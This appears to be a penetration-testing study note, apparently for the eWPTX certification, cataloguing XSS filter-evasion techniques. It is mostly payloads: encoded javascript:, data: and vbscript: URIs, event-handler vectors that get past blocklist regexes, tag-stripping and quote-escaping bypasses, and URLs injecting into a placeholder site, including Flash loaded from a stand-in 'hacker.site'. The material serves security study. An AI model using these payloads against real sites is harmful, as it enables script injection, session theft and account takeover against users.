---
title: "4 - XSS Filter Evasion"
classes: single
header:  
  teaser: /assets/images/posts/ewptx/ewptx-teaser5.jpg
  overlay_image: /assets/images/main/header4.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Bypass blacklisting Filters, sanitization and Browser Filters"
description: "Bypass blacklisting Filters, sanitization and Browser Filters"
categories:
  - notes
  - ewptx
tags:
  - advanced
  - pentest
  - web
  - bypass
toc: true
---

# Filter Evasion and WAF Bypassing

	https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

	http://html5sec.org/
	
	
- Common scenarios

1. The XSS vector is blocked by the application or something else
2. The XSS vector is sanitized
3. The XSS vector is filtered or blocked by the browser



## Bypassing Blackliting Filters

Its the most common. Their goal is to detect specific patterns and prevent malicious behaviors.

### Inject Script Code
```js
<script>

# The <script> tag is the primary method which can be used to execute client-side scripting code such as javascript.
```

### Bypassing Weak script Tag Banning
```js
- Upper and Lower-case characters
- Upper and Lower-case without closing tag
- Random string after the tag name
- Newline after the tag name
- Nested tags
- NULL byte (IE up to v9)
# examples in images
```

## ModSecurity > Script Tag Based XSS Vectors Rule
There are several alternatives in which its possible to run our code, such as different HTML tags and related event handlers.

### Beyond script Tag... Using HTML Attributes
```js
<a href="javascript:alert(1)">show</a>
<a href="data:text/html;base64,<alert(1) encoded>"show</a>
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data="javascript:alert(1)">
<object data="data:text/html;base64, <alert(1) encoded>">

# https://github.com/evilcos/xss.swf
<object data="//hacker.site/xss.swf">
<embed code="//hacker.site/xss.swf" allowscriptaccess=always>
```

### Beyond script Tag... Using HTML Events
- Events are they way that HTML DOM adds interactivity between the website and its visitors; This happens simply by executing the client-side code (e.g, JavaScript)

Almost all event handler identifier start with **on** and are followerd by the name of the event. One of the most used is **onerror**:
```js
<img src=x onerror=alert(1)>
```

→ but, there are maybe other events: http://help.dottoro.com/lhwfcplu.php

Examples:
```js
<body onload=alert(1)>
<input type=image src=x:x onerror=alert(1)>
<isindex onmouseover="alert(1)" >
<form oninput=alert(1)><input></form>
<texarea autofocus onfocus=alert(1)>
<input oncut=alert(1)>
<svg onload=alert(1)>
<keygen autofocus onfocus=alert(1)">
<video><source onerror="alert(1)">
<marquee onstart=alert(1)>
```

- From a defensive point of view, the solution is to filter all the events that start with **on** in order to block this injection point.

This is a very common regex you might find used widely:
```js
(on\w+\s*=)

# We can bypass this filter:
<svg/onload=alert(1)>
<svg//////onload=alert(1)>
<svg id=x; onload=alert(1)>
<svg id='x' onload=alert(1)>
```

So, we have an **Upgrade**:
```js
(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
```

- However, Some browsers convert the control character to a space, thus the \s meta-character is not enough to cover all possible chars.

We can bypass that too:
```js
<svg onload%09=alert(1)> # Works in all browsers except Safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)>  # IE only
```

Browsers are in continuous evolution; Therefore, some of the chars allowed may not work anymore. So, Shazzer Fuzz DB has created two fuzzer tests:

→ http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name

→ http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name

To data, a valid regex rule should be the following:
```js
(?i)([\s\"'`;\/0-9\=\x00\x09\x0A\x0C\0x0D\x3B\x2C\x28\x3B]+on\w+[\s\x00\x09\x0A\x0C\0x0D\x3B\x2C\x28\x3B]*?=)
```

## Keyword Based Filters
There are filters focused on preventing scripting mode such as **alert, javascript, eval**

### Char Escaping
Here we see Unicode Escaping without using native functions:
```js
<script>\u0061lert(1)</script>
<script>\u0061\u006\u0065\u0072\u0074(1)</script>
```

Unicode escaping using native functions. Eval is just one of many:
```js
<script>eval("\u0061lert(1)")</script>
<script>eval("\u0061\u006\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

IF the filtered vector is within a string, in addition to Unicode, there are multiple escapses we may adopt:
```js
<img src=x onerror="\u0061lert(1)"/>
<img src=x onerror="eval('\141lert(1)')"/>     # octal escape
<img src=x onerror="eval('\x61lert(1)')"/>     # hexa escape

<img src=x onerror="eval('&#x0061;lert(1)')"/> # hexa numeric char reference
<img src=x onerror="eval('&#97;lert(1)')"/>    # decimal NCR
<img src=x onerror="eval('\a\l\ert(1\)')"/>    # superfluous escapes chars

<img src=x onerror="eval('\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>  '
# All chars escaping can stay together.
```

### Contructing String
Javascript jas several functions useful to create string:
```js
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
177985081..toString(36)
```

### Execution Sinks
- Technically, functions that parse string as JavaScript code are called execution sinks, and JavaScript offers several alternatives.

Some Sinks:
```js
setTimeout("JSCode") //all browsers
setInterval("JSCode") //all browsers
setImmediate("JSCode") //IE 10+
Function("JSCode") //all browsers

# moreover: https://code.google.com/p/domxsswiki/wiki/ExecutionSinks
```

Variation of the Function sink:
```js
[].constructor.constructor(alert(1))
```

|object | array   | function  | XSS vector|


### Pseudo-protocols
**javascript:** is an unofficional URI scheme, commonly referred as a pseudo-protocol.

- javascript followerd by (:) is usually blocked

Example:
```js
<a href="javascript:alert(1)"/>    " //blocked
# javascript: is not needed on event handlers; SO, we should avoid using it.
```

Bypass examples:
```js
<object data="JaVScRiPt:alert(1)">
<object data="javascript&colon;:alert(1)">
<object data="java
script:alert(1)">
<object data="javascript&#x003A;alert(1)">
<object data="javascript&#58;alert(1)">
<object data="&#x6A;avascript:alert(1)">
<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
```

- In addition to **javascript:**, there are also **data:** and the IE exclusive **vbscript:**

Data URI scheme:
```js
data:[<mediatype>][;base64],<data>

# mediatype is usually 'text/html'
```

If **javascript:** is blocked:
```js
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,base64,<base64 encoded>">
```

If **data:** is blocked:
```js
<embed code="DaTa:text/html,<script>alert(1)</script>">
<embed code="data&colon;text/html,<script>alert(1)</script>">
<embed code="data&#x003A;text/html,<script>alert(1)</script>">
<embed code="&#x64;&#x61;ta:text/html,<script>alert(1)</script>">
```

The **vbscript** pseudo-protocol is not so common, because it can only be used with IE.

- From IE11 in Edge, vbscript is no longer supported.

How to use vbscript:
```js
<img src=a onerror="vbscript:msgbox 1"/> //works till IE8
<img src=b onerror="vbs:msgbox 2"/> //works till IE8
<img src=c onerror="vbs:alert(3)"/>   "//works till IE Edge
<img src=d onerror="vbscript:alert(4)"/>  "//works till IE Edge
```

Bypass vbscript:
```js
<img src=x onerror="vbscript&#x003A;alert(1)"/>    "
<img src=x onerror="vb&#x63;cript:alert(1)"/>       "

<img src=x onerror="v&#00;bs&#x00;cri pt:alert(1)"/> //using NUL bytes
```

Tool to obfuscate:
```js
http://dennisbabkin.com/screnc/
```








## Bypassing Sanitization

The most common is to HTML-encode such as:
```js
< (&lt;)
> (&gt;)
```

### String Manipulations
Example: 
```js
removing <script> tag
```

### Removing HTML tags
The check is not performed recursively:
```js
<scr<script>ipt>alert(1)</script> # this could be a bypass
```

If the filter performs recursive checks, we can still bypass. maybe changing the order of injected strings.
```js
<scr<iframe>ipt>alert(1)</script> //this could be a bypass
```

- it all depends on the filter that we are facing

→ moreover: https://els-cdn.content-api.ine.com/eda3ac9d-554a-469a-98c6-639c90f0c7a5/index.html#

### Escaping Quotes
- Filters place the backslash char **\** before quotes to escape that kind of character

Example:
```js
randomkey\' alert(1);  # escape the apostrophe
randomkey\\' alert(1); # escape the backslash
```

One of useful Javascript methods is:
```js
String.fromCharCode()
```

It allows us to generate strings starting from a sequence of Unicode values:
```js
String.fromCharCode(120,115,9416)

# u+0078 Latin Small Letter x
# u+0073 Latin small Letter s
# u+24C8 Circled Latin capital letter (S)
```

```js
/your string/.source  //space allowed
43804..toString(36)   //spaces not allowed in Base36
```

Using unescape method:
```js
unescape(/%78%u0073%73/.source) //its deprecated
```

Using decodeURI and decodeURIComponent:
```js
# in this case, characters needs to be URL-encoded to avoid URI malformed errors

decodeURI(/alert(%22xss%22)/.source)
decodeURIcomponent(/alert(%22xss%22)/.source)
```

- These methods could be useful if you can inject into a script or event handler. nut you cannot use quotation marks because they are properly escaped.
- Dont forget that each of them will return a string, so you need an execution **sink** to trigger the code (IE: **eval**)


### Escaping Parentheses
- The technique abuses the onerror handler, assigning a function to call once an error has been generated using throw followed by the arguments to the function assigned to the error handler.

→ moreover: http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/

```js
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
# eval - function to invoke in case of error
# throw - generate the error
# alert... - parameters For the error function

onerror=alert;throw 1; // a simple version
# does not work in Firefox and IE
```

And since the arguments section is quoted, its possible to do some encoding like the following:
```js
<img src=x onerror="window.onerror=eval;throw'\u003d&#x006C;ert&#x0028;18#41;'"/>
```





## Bypassing Browser Filters
They dont cover all possible XSS attacl scenarios and they focus on Reflected type of XSS.

### UnFiltered Scenarios - Injecting Inside HTML Tag
```js
<svg/onload=alert(1)> # its detected by all main filters
```

```js
# Just by removing the final (>) we jave a bypass For browsers with XSSAuditor
<svg/onload=alert(1) // works chromium based browser
```

Injecting inside HTML Tag Attributes:
```js
site.com/inject?x=giuseppe"><svg/onload=alert(1)>
```

We can bypass WebKit with:
```js
site.com/inject?x=giuseppe"><a/href="data:text/html;base64,<base64 payload>">clickhere<!--
```

Injecting Inside SCRIPT Tag:
```js
site.com/inject?name=belucci";alert(1);//
```

Injecting Inside Event Attributes:
```js
site.com/inject?roomID=alert(1)
```

DOM Based:
```js
site.com/inject?next=javascript:alert(1)
```

- DOM Based, there are other scenarios that are not covered by browsers filters.

> For example, **fragmented** vectors in multiple GET parameters or attacks that are not reflected in the same page, mXSS, etc.

